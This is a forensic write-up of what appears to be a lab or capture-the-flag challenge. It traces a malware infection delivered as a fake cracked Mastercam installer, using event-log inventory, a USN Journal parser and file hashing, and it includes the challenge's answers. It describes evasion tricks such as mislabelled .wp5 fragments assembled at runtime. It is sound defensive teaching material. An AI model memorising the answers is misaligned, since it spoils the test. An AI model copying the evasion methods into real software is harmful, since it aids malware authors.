### When did the installer process terminate?

==Answer== `2025-06-21 18:35:58`
<div align="center">
<br>
<br>
</div>

### 2.1 Inventory the event logs and test for Sysmon

**Why this step**

Prefetch records execution start times only, so Task 2's termination question needs a log source that records process exit. Before choosing one, enumerate what was collected — the presence or absence of Sysmon determines whether high-fidelity process telemetry exists or whether the investigation must fall back on native Windows auditing.

**Command**

```bash
ls -la evidence/C/Windows/System32/winevt/logs/
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `ls -la` | Long listing, all entries | Shows size, owner and modification time alongside each name — size and mtime are the triage signal here |
| `evidence/C/Windows/System32/winevt/logs/` | Windows event-log directory | The canonical location of every `.evtx` file on a Windows host |

**Theory — reading an EVTX directory without opening a single log**

Two columns do most of the work before any parsing begins.

**Size.** A freshly initialised EVTX file is **69,632 bytes** — one 64 KiB chunk plus the file header. Any log still sitting at exactly that size is effectively empty. Anything larger holds records, and the larger it is, the more it holds.

**Modification time.** The collection was taken 2025-06-21. Logs whose mtime is `Jan 23 2025` were last written at system build time and are irrelevant; logs stamped `Jun 21 2025` were written on the incident day and form the candidate set.

Filenames use `%4` as an escaped `/`, so `Microsoft-Windows-PowerShell%4Operational.evtx` is the channel `Microsoft-Windows-PowerShell/Operational`.

**Result**

```
total 36976
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Application.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Client-License-Flexible-Platform%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Client-Licensing-Platform%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-AAD%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Application-Experience%4Program-Compatibility-Troubleshooter.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-AppModel-Runtime%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-AppReadiness%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-AppReadiness%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-AppXDeployment%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 5246976 Jun 21  2025  Microsoft-Windows-AppXDeploymentServer%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-AppxPackaging%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Audio%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Audio%4PlaybackManager.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Biometrics%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025 'Microsoft-Windows-BitLocker%4BitLocker Management.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-Bits-Client%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-CloudStore%4Initialization.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-CloudStore%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-CodeIntegrity%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Containers-BindFlt%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Containers-Wcifs%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Crypto-DPAPI%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Crypto-NCrypt%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-DeviceSetupManager%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-DeviceSetupManager%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Dhcp-Client%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Diagnosis-DPS%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Diagnosis-Scheduled%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Diagnosis-Scripted%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Diagnosis-Scripted%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Diagnostics-Performance%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-DiskDiagnosticDataCollector%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-GroupPolicy%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-HelloForBusiness%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Kernel-Boot%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Kernel-EventTracing%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Kernel-IO%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jan 23  2025  Microsoft-Windows-Kernel-PnP%4Configuration.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Kernel-ShimEngine%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Kernel-WHEA%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025 'Microsoft-Windows-Known Folders API Service.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-LanguagePackSetup%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-LiveId%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-MUI%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-NcdAutoSetup%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-NCSI%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-NetworkProfile%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Ntfs%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Ntfs%4WHC.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Partition%4Diagnostic.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-PowerShell%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-PrintService%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-Privacy-Auditing%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Provisioning-Diagnostics-Provider%4Admin.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-PushNotification-Platform%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-ReadyBoost%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Resource-Exhaustion-Detector%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Resource-Exhaustion-Resolver%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Security-LessPrivilegedAppContainer%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Security-Mitigations%4KernelMode.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Security-SPP-UX-Notifications%4ActionCenter.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-SettingSync%4Debug.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-SettingSync%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-ShellCommon-StartLayoutPopulation%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-Shell-Core%4AppDefaults.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-Shell-Core%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-SmbClient%4Connectivity.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-SmbClient%4Security.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-SMBServer%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-StateRepository%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-StorageSpaces-Driver%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-Storage-Storport%4Health.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Microsoft-Windows-Storage-Storport%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 3215360 Jun 21  2025  Microsoft-Windows-Store%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Storsvc%4Diagnostic.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-TaskScheduler%4Maintenance.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-Time-Service%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-TWinUI%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-TZSync%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-UniversalTelemetryClient%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025 'Microsoft-Windows-User Device Registration%4Admin.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-UserPnp%4DeviceInstall.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025 'Microsoft-Windows-User Profile Service%4Operational.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-VolumeSnapshot-Driver%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Wcmsvc%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-WebAuthN%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-WFP%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025 'Microsoft-Windows-Windows Firewall With Advanced Security%4FirewallDiagnostics.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025 'Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx'
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-WindowsSystemAssessmentTool%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-WindowsUpdateClient%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-WinINet-Config%4ProxyConfigChanged.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Microsoft-Windows-Winlogon%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jun 21  2025  Microsoft-Windows-WinRM%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1052672 Jun 21  2025  Microsoft-Windows-WMI-Activity%4Operational.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Parameters.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  Security.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca   69632 Jan 23  2025  Setup.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025  System.evtx
-rw-rw-r-- 1 nedmoeca nedmoeca 1118208 Jun 21  2025 'Windows PowerShell.evtx'
```

**What this gives you**

Key finding: **Sysmon is not installed.** There is no `Microsoft-Windows-Sysmon%4Operational.evtx` anywhere in the collection. Every technique that depends on Sysmon is therefore unavailable, and each task must be answered from a native Windows source instead:

| Sysmon capability that does not exist here | Event ID | Native fallback |
| --- | --- | --- |
| Process creation with full command line and hashes | 1 | Security 4688, if command-line auditing is enabled |
| Process termination | 5 | Security 4689, if audit process tracking is enabled |
| Image loaded, with SHA-256 | 7 | Amcache (SHA-1 only), or hashing the recovered file directly |
| File created | 11 | `$MFT` and `$J` USN journal |
| DNS query | 22 | DNS client cache, or strings inside the payload |

Note a second absence: there is no `Microsoft-Windows-Windows Defender%4Operational.evtx` either. The host had no endpoint detection telemetry of any kind — which is exactly the condition the malware's AV/EDR checks were written to confirm.

Rank the surviving candidates by size and modification date:

| Log | Size (bytes) | Modified | Analysis | Simple Explanation |
| --- | --- | --- | --- | --- |
| `Security.evtx` | 1,118,208 | Jun 21 2025 | Primary target — holds 4688/4689 process tracking and 4624 logons if auditing is enabled | Windows' own audit trail of who ran what |
| `Microsoft-Windows-Privacy-Auditing%4Operational.evtx` | 1,118,208 | Jun 21 2025 | Records application access to protected resources | Logs which apps reached for sensitive data |
| `Microsoft-Windows-Bits-Client%4Operational.evtx` | 1,052,672 | Jun 21 2025 | Background Intelligent Transfer Service — a common malware download channel | Windows' own file-downloading service |
| `Microsoft-Windows-WMI-Activity%4Operational.evtx` | 1,052,672 | Jun 21 2025 | WMI queries, consistent with the `WMIC.EXE` prefetch entry | Records system-information queries, often used for reconnaissance |
| `Windows PowerShell.evtx` | 1,118,208 | Jun 21 2025 | Engine lifecycle events, consistent with the `POWERSHELL.EXE` prefetch entry | Confirms PowerShell ran, and under which host |
| `Microsoft-Windows-Windows Firewall …%4Firewall.evtx` | 1,052,672 | Jun 21 2025 | Firewall rule additions and profile changes | Shows whether the malware punched a hole in the firewall |
| `Application.evtx`, `System.evtx` | 1,118,208 each | Jun 21 2025 | Service installs, crashes, driver loads | General system and application events |
| `Microsoft-Windows-PowerShell%4Operational.evtx` | 69,632 | Jun 21 2025 | Empty — script-block logging was disabled | The detailed PowerShell log was never turned on |
| `Microsoft-Windows-Ntfs%4Operational.evtx` | 69,632 | Jun 21 2025 | Empty | No NTFS-level event data |
| `Microsoft-Windows-TaskScheduler%4Maintenance.evtx` | 69,632 | Jun 21 2025 | Empty, and the `Operational` channel was not collected | Scheduled-task execution history must come from the task XML on disk instead |

**Next**

Parse `Security.evtx` and profile its Event IDs to confirm whether audit process tracking was enabled, which decides whether 4689 can answer the termination question.

---

### 2.2 Reconstruct the execution timeline from the USN Journal

**Why this step**

Section 2.1 established that no process-exit record exists: Sysmon is absent and `Security.evtx` carries 4688 without 4689. With no direct termination event, the installer's lifetime must be bounded by filesystem side effects instead — and the NTFS USN Journal records every one of them with sub-second precision.

**Command**

```bash
python3 usnparse.py "evidence/C/\$Extend/\$J" | awk '$1=="2025-06-21" && $2>"18:33" && $2<"18:40"'
```

The parser is a minimal `$UsnJrnl:$J` reader (V2 records: 4-byte length, 8-byte timestamp at offset 32, 4-byte reason at offset 40, UTF-16LE filename at the offset given at byte 58):

```python
import struct, datetime
d = open(path, 'rb').read()
i = 0
while i < len(d) - 4:
    ln = struct.unpack_from('<I', d, i)[0]
    if ln == 0:
        i += 8; continue
    if ln < 60 or ln > 1024 or i + ln > len(d):
        i += 8; continue
    major  = struct.unpack_from('<H', d, i + 4)[0]
    ts     = struct.unpack_from('<Q', d, i + 32)[0]
    reason = struct.unpack_from('<I', d, i + 40)[0]
    nlen   = struct.unpack_from('<H', d, i + 56)[0]
    noff   = struct.unpack_from('<H', d, i + 58)[0]
    name   = d[i + noff : i + noff + nlen].decode('utf-16-le', 'replace')
    i += ln
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `$Extend\$J` | The USN Journal data stream | NTFS's own change log for every file on the volume |
| Record length at offset 0 | Variable record size | Each entry states how long it is, so the parser can walk to the next |
| `major` version at offset 4 | Record format version | Version 2 is the standard Windows 10/11 layout |
| Timestamp at offset 32 | FILETIME, 100-ns since 1601-01-01 | Convert by dividing by 10 into microseconds and adding to 1601 |
| Reason flags at offset 40 | Bitmask of what changed | `0x100` = FILE_CREATE, `0x200` = FILE_DELETE, `0x2` = DATA_EXTEND, `0x80000000` = CLOSE |
| Name length / offset (56 / 58) | Where the filename sits inside the record | Names are UTF-16LE and carry no path — only the filename |

**Theory — the USN Journal's strengths and its one blind spot**

The journal records *filename only*, never the full path. A `FILE_CREATE` for `K` tells you a file called `K` was created but not where. Pair it with the `$MFT` (which holds parent-directory references) when location matters. In exchange for that limitation it gives something no event log here does: a complete, ordered, sub-second record of every create, write, truncate, rename and delete on the volume — including files the attacker deleted afterwards.

Prefetch files appear in this journal too, and that makes it a proxy execution timeline. Windows creates a `.pf` roughly ten seconds after a program starts and rewrites it (`DATA_TRUNCATION` + `DATA_EXTEND`) on each subsequent run. Every `FILE_CREATE` of a `.pf` therefore marks a first execution, and every rewrite marks a later one.

**Result**

```
18:33:58.997  download mastercam x9 full crack pc.exe   FILE_CREATE
18:34:08.137  download mastercam x9 full crack pc.exe   DATA_OVERWRITE|DATA_EXTEND|FILE_CREATE|BASIC_INFO|CLOSE
18:34:22.231  nsv52EF.tmp                               FILE_CREATE
18:34:22.231  nsv52EF.tmp                               FILE_DELETE|CLOSE
18:34:25.511  Mysql.wp5                                 FILE_CREATE
18:34:25.527  Authorization.wp5                         FILE_CREATE
18:34:25.558  Art.wp5                                   FILE_CREATE
18:34:25.558  Lock.wp5                                  FILE_CREATE
18:34:25.574  Play.wp5                                  FILE_CREATE
18:34:25.574  Romania.wp5                               FILE_CREATE
18:34:25.621  Refugees.wp5                              FILE_CREATE
18:34:25.699  Runner.wp5                                FILE_CREATE
18:34:25.746  Gba.wp5                                   FILE_CREATE
18:34:29.386  DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf FILE_CREATE
18:34:31.262  Mysql.wp5.bat                             FILE_CREATE
18:34:40.106  CMD.EXE-6D6290C5.pf                       FILE_CREATE
18:34:46.496  TASKLIST.EXE-4641012C.pf                  FILE_CREATE
18:34:46.496  FINDSTR.EXE-5986D423.pf                   FILE_CREATE
18:34:47.418  448887                                    FILE_CREATE
18:34:48.917  CAB05572.TMP                              FILE_CREATE
18:34:48.917  Theology                                  FILE_CREATE
18:34:48.980  Analyze / Appreciated / Draws / Investors / Mechanisms / Thanksgiving   FILE_CREATE
18:34:48.996  Balls / Hell / Subsequently               FILE_CREATE
18:34:49.012  Dawn                                      FILE_CREATE
18:34:49.168  EXTRAC32.EXE-4FD3FA35.pf                  FILE_CREATE
18:34:49.480  Moscow.com                                FILE_CREATE
18:34:49.668  Moscow.com                                DATA_EXTEND
18:34:50.168  Moscow.com                                DATA_EXTEND|CLOSE
18:34:50.684  K                                         FILE_CREATE
18:34:50.746  K                                         DATA_EXTEND|FILE_CREATE|CLOSE
18:34:52.980  K                                         FILE_DELETE|CLOSE
18:34:57.606  CHOICE.EXE-42DD1650.pf                    FILE_CREATE
18:35:01.121  MOSCOW.COM-34B22CCB.pf                    FILE_CREATE
18:35:47.528  nsmA020.tmp                               FILE_CREATE
18:35:47.528  nsmA020.tmp                               FILE_DELETE|CLOSE
18:35:47.824  Mysql.wp5 … Gba.wp5                       DATA_TRUNCATION|DATA_EXTEND  (all nine rewritten)
18:35:48.293  Mysql.wp5.bat                             DATA_OVERWRITE|DATA_EXTEND|DATA_TRUNCATION|BASIC_INFO|CLOSE
18:35:58.043  DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf DATA_TRUNCATION
18:35:58.074  DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf DATA_EXTEND|DATA_TRUNCATION|CLOSE
18:36:04.371  CAB05196.TMP                              FILE_CREATE   (second extraction pass)
18:36:05.496  K                                         FILE_CREATE
18:36:06.105  K                                         FILE_DELETE|CLOSE
18:36:20.996  MOSCOW.COM-34B22CCB.pf                    DATA_EXTEND|DATA_TRUNCATION|CLOSE
```

**What this gives you**

Key finding: the installer's prefetch file is last written at **2025-06-21 18:35:58.074 UTC**, which is the final flush of its execution record and the last filesystem activity attributable to the installer process. Record that as the termination time.

Read the two execution cycles the journal exposes:

| Cycle | Installer start | Payload staged | Batch written | Terminates |
| --- | --- | --- | --- | --- |
| First | 18:34:19 | 18:34:25 (nine `.wp5` files) | 18:34:31 (`Mysql.wp5.bat`) | prefetch created 18:34:29 |
| Second | 18:35:47 | 18:35:47 (all nine rewritten) | 18:35:48 (rewritten) | prefetch rewritten 18:35:58 |

Note the NSIS signature: `nsv52EF.tmp` and `nsmA020.tmp` are created and immediately deleted at each launch. The `ns*.tmp` naming is how Nullsoft Scriptable Install System unpacks its plugins, confirming the installer is an NSIS package rather than an MSI or InstallShield build.

Caveat this answer honestly. Prefetch is written roughly ten seconds after a process *starts*, so 18:35:58 sits ten seconds after the 18:35:47 launch. In the absence of Security 4689 or Sysmon Event ID 5 it is the closest available proxy for process end, not a recorded exit event.

**Next**

Identify which of the staged files landed first, and establish what each one is.


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3
### What was the first file dropped by the malware post-installation?

==Answer== Mysql.wp5
<div align="center">
<br>
<br>
</div>

### 3.1 Identify the first dropped file and classify the staged set

**Why this step**

The USN timeline in 2.2 shows a burst of file creations 6 seconds after the installer launched. Ordering that burst to the millisecond names the first artifact the malware wrote to disk, and typing each file establishes which are payload and which are decoys.

**Command**

```bash
cd "evidence/C/Users/Administrator/AppData/Local/Temp"
ls -la && file * 448887/*
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `%LOCALAPPDATA%\Temp` | Per-user temp directory | Where the prefetch filenames list in 1.2 pointed |
| `ls -la` | Long listing | Exposes sizes and modification dates |
| `file *` | Magic-byte type identification | Names each file by its content, not its extension — essential when extensions are deliberately wrong |

**Theory — why the extension lies**

`.wp5` is the WordPerfect 5 document extension, chosen precisely because nothing on a modern Windows host handles it. Files with an unknown extension are ignored by Explorer previewers, skipped by many extension-based AV scan policies, and look inert to a user who wanders into their temp folder. `file` reads the first bytes instead of the name, which is why it correctly reports one of these `.wp5` files as a Microsoft Cabinet archive and another as an ASCII batch script.

**Result**

USN ordering of the drop burst:

```
18:34:25.511  Mysql.wp5          FILE_CREATE   <-- first
18:34:25.527  Authorization.wp5  FILE_CREATE
18:34:25.558  Art.wp5            FILE_CREATE
18:34:25.558  Lock.wp5           FILE_CREATE
18:34:25.574  Play.wp5           FILE_CREATE
18:34:25.574  Romania.wp5        FILE_CREATE
18:34:25.621  Refugees.wp5       FILE_CREATE
18:34:25.699  Runner.wp5         FILE_CREATE
18:34:25.746  Gba.wp5            FILE_CREATE
```

Type identification:

```
Mysql.wp5:          ASCII text, with very long lines (763), with CRLF line terminators
Play.wp5:           Microsoft Cabinet archive data, many, 488221 bytes, 11 files, ID 9045,
                    number 1, 29 datablocks, 0x1 compression
Art.wp5:            data
Authorization.wp5:  data
Gba.wp5:            data
Lock.wp5:           data
Refugees.wp5:       data
Romania.wp5:        data
Runner.wp5:         data
448887/Moscow.com:  PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections
Subsequently:       DOS executable (COM)
```

**What this gives you**

Key finding: **`Mysql.wp5`** is the first file the malware wrote after installation, created at **2025-06-21 18:34:25.511 UTC**, and it is plain ASCII text — the obfuscated batch script that drives the entire chain.

Classify the nine staged files into three roles:

| File | Size | True type | Role | Simple Explanation |
| --- | --- | --- | --- | --- |
| `Mysql.wp5` | 19,526 | ASCII batch script | Orchestrator | The instruction sheet for everything that follows |
| `Play.wp5` | 488,221 | Microsoft Cabinet, 11 files | Container | A zip-like archive holding eleven hidden pieces |
| `Runner.wp5` | 76,800 | Opaque binary | Payload fragment 1 | A slice of the final script |
| `Art.wp5` | 58,368 | Opaque binary | Payload fragment 2 | A slice of the final script |
| `Gba.wp5` | 76,800 | Opaque binary | Payload fragment 3 | A slice of the final script |
| `Romania.wp5` | 66,560 | Opaque binary | Payload fragment 4 | A slice of the final script |
| `Refugees.wp5` | 68,608 | Opaque binary | Payload fragment 5 | A slice of the final script |
| `Authorization.wp5` | 78,848 | Opaque binary | Payload fragment 6 | A slice of the final script |
| `Lock.wp5` | 57,717 | Opaque binary | Payload fragment 7 | A slice of the final script |

No single dropped file is a working executable. That is the core evasion idea of this campaign: the malicious binary never exists on disk until the batch script assembles it at runtime, so static scanning of any individual artifact yields nothing.

Note that `Mysql.wp5` was later copied to `Mysql.wp5.bat` at 18:34:31 — the `.bat` extension is only applied at the moment of execution.

**Next**

Hash the cabinet archive to fingerprint the container before examining what the batch does with it.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4
### What is the SHA-256 hash of the .cab archive extracted during execution?

==Answer== `35efc15a41cf54a51703711e0b117b1899e4698bed1a4fdae638ebb7a3a190e0`
<div align="center">
<br>
<br>
</div>

### 4.1 Hash the cabinet archive

**Why this step**

`file` identified `Play.wp5` as a Microsoft Cabinet in 3.1. A cryptographic hash turns that observation into a shareable indicator of compromise suitable for threat-intelligence lookup and for blocking across the estate.

**Command**

```bash
sha256sum "evidence/C/Users/Administrator/AppData/Local/Temp/Play.wp5"
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `sha256sum` | SHA-256 digest utility | Produces a 64-character fingerprint unique to this exact file content |
| `Play.wp5` | The cabinet archive | Named as a WordPerfect document, actually a `.cab` |

**Theory — why hash the container and not only its contents**

Hashing both matters, for different reasons. The extracted components are what execute, so their hashes detect the payload wherever it lands. The container's hash detects the *delivery package* — and because the eleven files inside are reassembled in a fixed order, a single container hash covers the whole set in one indicator. Note that any re-packing changes the container hash while leaving the component hashes intact, so a defender should deploy both.

**Result**

```
35efc15a41cf54a51703711e0b117b1899e4698bed1a4fdae638ebb7a3a190e0  Play.wp5
```

Supporting metadata from `file`:

```
Play.wp5: Microsoft Cabinet archive data, many, 488221 bytes, 11 files, at 0x2c
          last modified Sun, Jun 20 2025 02:40:38 +A "Theology"
          last modified Sun, Jun 20 2025 02:40:38 +A "Thanksgiving",
          ID 9045, number 1, 29 datablocks, 0x1 compression
```

**What this gives you**

Key finding: the cabinet's SHA-256 is **`35efc15a41cf54a51703711e0b117b1899e4698bed1a4fdae638ebb7a3a190e0`**, containing **11 files**, built **2025-06-20 02:40:38** — one day before deployment to this host.

